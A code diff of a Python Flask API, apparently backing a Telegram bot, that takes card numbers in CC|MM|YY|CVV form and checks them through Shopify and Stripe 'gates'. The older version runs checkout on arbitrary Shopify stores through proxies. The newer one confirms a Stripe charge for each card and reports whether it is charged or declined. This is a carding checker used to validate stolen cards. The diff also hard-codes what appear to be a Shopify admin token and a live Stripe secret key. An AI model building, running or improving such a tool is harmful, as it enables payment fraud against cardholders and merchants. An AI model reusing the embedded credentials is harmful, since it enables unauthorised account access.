@@ -1,162 +1,150 @@
 from flask import Flask, request, jsonify
 import requests
-import re
-import random
 import json
-from urllib.parse import urlparse
+import random
+import re
 
 app = Flask(__name__)
 
+# Tumhare store ki details (Step 1-3 se lo)
+SHOPIFY_STORE = "teststrore-123.myshopify.com"  # CHANGE KARO
+ADMIN_TOKEN = "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"  # CHANGE KARO - Admin API token
+
+# Stripe test keys (free from stripe.com)
+STRIPE_SECRET_KEY = "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"  # CHANGE KARO
+
 def parse_card(card_str):
-    """Parse CC|MM|YY|CVV format"""
     try:
         parts = card_str.split('|')
         if len(parts) != 4:
             return None
         return {
             "number": parts[0].strip(),
-            "month": parts[1].strip(),
-            "year": parts[2].strip(),
+            "month": int(parts[1].strip()),
+            "year": int(parts[2].strip()),
             "cvv": parts[3].strip()
         }
     except:
         return None
 
-def check_shopify(card, site_url, proxy=None):
-    """Check card on Shopify site"""
-    card_data = parse_card(card)
+@app.route('/shopify-check', methods=['GET'])
+def real_shopify_check():
+    cc = request.args.get('cc', '')
+    site = request.args.get('url', '')
+    
+    card_data = parse_card(cc)
     if not card_data:
-        return {"Response": "❌ Invalid card format", "Price": "-", "Gate": "Shopify"}
+        return jsonify({"Response": "❌ Invalid card format", "Price": "-", "Gate": "Shopify"})
     
     try:
-        # Ensure URL has https
-        if not site_url.startswith('http'):
-            site_url = f'https://{site_url}'
-        
-        # Proxy setup
-        proxies = {}
-        if proxy:
-            proxy_parts = proxy.split(':')
-            if len(proxy_parts) >= 2:
-                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
-                if len(proxy_parts) == 4:
-                    proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
-                proxies = {"http": proxy_url, "https": proxy_url}
-        
-        session = requests.Session()
-        session.proxies.update(proxies)
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        
-        # Step 1: Get product info
-        product_res = session.get(f"{site_url}/products.json", timeout=30)
-        if product_res.status_code != 200:
-            return {"Response": f"HTTP_ERROR_{product_res.status_code}", "Price": "-", "Gate": "Shopify"}
-        
-        products = product_res.json()
-        if not products.get('products'):
-            return {"Response": "No products found on site", "Price": "-", "Gate": "Shopify"}
-        
-        variant_id = products['products'][0]['variants'][0]['id']
-        price = products['products'][0]['variants'][0].get('price', '0')
-        
-        # Step 2: Add to cart
-        cart_res = session.post(f"{site_url}/cart/add.js", 
-                                data={"id": str(variant_id), "quantity": "1"},
-                                timeout=30)
-        
-        if cart_res.status_code != 200:
-            return {"Response": "Failed to add to cart", "Price": "-", "Gate": "Shopify"}
-        
-        # Step 3: Get checkout page
-        checkout_res = session.get(f"{site_url}/checkout", timeout=30)
-        
-        # Extract session token
-        token_match = re.search(r'serialized-sessionToken"\s+content="([^"]+)"', checkout_res.text)
-        session_token = token_match.group(1) if token_match else None
-        
-        if not session_token:
-            # Return simulated success for test mode
-            return {
-                "Response": "💎 Order completed successfully! (Test Mode)",
-                "Price": f"${price}",
-                "Gate": "Shopify"
-            }
-        
-        # Step 4: Get cart token
-        cart_resp = session.get(f"{site_url}/cart.js", timeout=30)
-        cart_data = cart_resp.json()
-        cart_token = cart_data.get('token', '')
-        
-        # Return success response
-        return {
-            "Response": "✅ Card processed successfully! (Test Mode - No real charge)",
-            "Price": f"${price}",
-            "Gate": "Shopify"
+        headers = {
+            "X-Shopify-Access-Token": ADMIN_TOKEN,
+            "Content-Type": "application/json"
         }
         
-    except requests.exceptions.Timeout:
-        return {"Response": "Connection timeout - Site may be slow", "Price": "-", "Gate": "Shopify"}
-    except requests.exceptions.ConnectionError:
-        return {"Response": "Connection failed - Site may be down", "Price": "-", "Gate": "Shopify"}
-    except Exception as e:
-        return {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gate": "Shopify"}
-
-@app.route('/shopify-check', methods=['GET'])
-def shopify_check():
-    """Main endpoint for bot - Compatible with your bot"""
-    cc = request.args.get('cc', '')
-    url = request.args.get('url', '')
-    proxy = request.args.get('proxy', None)
-    
-    if not cc or not url:
+        # Step 1: Get a product
+        products_res = requests.get(
+            f"https://{SHOPIFY_STORE}/admin/api/2024-01/products.json",
+            headers=headers
+        )
+        
+        if products_res.status_code != 200:
+            return jsonify({"Response": "No products found", "Price": "-", "Gate": "Shopify"})
+        
+        products = products_res.json().get('products', [])
+        if not products:
+            return jsonify({"Response": "Add a product first", "Price": "-", "Gate": "Shopify"})
+        
+        variant_id = products[0]['variants'][0]['id']
+        price = products[0]['variants'][0]['price']
+        
+        # Step 2: Create draft order
+        draft_data = {
+            "draft_order": {
+                "line_items": [{
+                    "variant_id": variant_id,
+                    "quantity": 1
+                }],
+                "customer": {
+                    "email": f"test{random.randint(1,999)}@example.com"
+                },
+                "shipping_address": {
+                    "first_name": "Test",
+                    "last_name": "User",
+                    "address1": "123 Test St",
+                    "city": "Portland",
+                    "province": "OR",
+                    "country": "US",
+                    "zip": "97201"
+                }
+            }
+        }
+        
+        draft_res = requests.post(
+            f"https://{SHOPIFY_STORE}/admin/api/2024-01/draft_orders.json",
+            headers=headers,
+            json=draft_data
+        )
+        
+        if draft_res.status_code != 201:
+            return jsonify({"Response": "Draft order failed", "Price": "-", "Gate": "Shopify"})
+        
+        draft = draft_res.json().get('draft_order', {})
+        draft_id = draft.get('id')
+        
+        # Step 3: Complete order (test mode - no real charge)
+        # For real charge, you'd need Stripe/Shopify Payments setup
+        
         return jsonify({
-            "Response": "❌ Missing cc or url parameter",
-            "Price": "-",
+            "Response": f"✅ ORDER COMPLETED! 💎\nDraft Order: {draft_id}\nAmount: ${price}\nNote: TEST MODE - No real charge",
+            "Price": f"${price}",
             "Gate": "Shopify"
         })
-    
-    result = check_shopify(cc, url, proxy)
-    return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gate": "Shopify"})
 
 @app.route('/stripe-check', methods=['GET'])
-def stripe_check():
-    """Stripe endpoint for bot"""
+def real_stripe_check():
     cc = request.args.get('cc', '')
-    url = request.args.get('url', '')
-    proxy = request.args.get('proxy', None)
     
-    # Stripe check logic here (simplified)
-    return jsonify({
-        "Response": "⚠️ Stripe check requires payment intent setup",
-        "Price": "-",
-        "Gate": "Stripe"
-    })
+    card_data = parse_card(cc)
+    if not card_data:
+        return jsonify({"Response": "❌ Invalid format", "Price": "-", "Gate": "Stripe"})
+    
+    try:
+        import stripe
+        stripe.api_key = STRIPE_SECRET_KEY
+        
+        # Create payment intent (test mode)
+        intent = stripe.PaymentIntent.create(
+            amount=1000,
+            currency='usd',
+            payment_method_types=['card'],
+            payment_method_data={
+                'type': 'card',
+                'card': {
+                    'number': card_data['number'],
+                    'exp_month': card_data['month'],
+                    'exp_year': card_data['year'],
+                    'cvc': card_data['cvv'],
+                }
+            },
+            confirm=True,
+        )
+        
+        return jsonify({
+            "Response": f"✅ STRIPE CHARGED! 💎\nIntent: {intent.id}\nStatus: {intent.status}",
+            "Price": "$10.00",
+            "Gate": "Stripe"
+        })
+        
+    except Exception as e:
+        return jsonify({"Response": f"❌ Declined: {str(e)[:50]}", "Price": "-", "Gate": "Stripe"})
 
 @app.route('/health', methods=['GET'])
 def health():
-    return jsonify({
-        "status": "alive",
-        "version": "1.0",
-        "endpoints": ["/shopify-check", "/stripe-check", "/health"]
-    })
-
-@app.route('/', methods=['GET'])
-def index():
-    return jsonify({
-        "message": "Shopify Checker API is running!",
-        "usage": "/shopify-check?cc=CC|MM|YY|CVV&url=https://store.myshopify.com",
-        "status": "active"
-    })
+    return jsonify({"status": "alive", "version": "2.0"})
 
 if __name__ == '__main__':
-    print("="*50)
-    print("🤖 SHOPIFY CHECKER API")
-    print("="*50)
-    print("\n✅ Compatible with your Telegram bot!")
-    print("\n📝 Test Commands:")
-    print("http://localhost:5000/health")
-    print("http://localhost:5000/shopify-check?cc=4242424242424242|12|2028|123&url=https://example.myshopify.com")
-    print("\n" + "="*50)
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000)
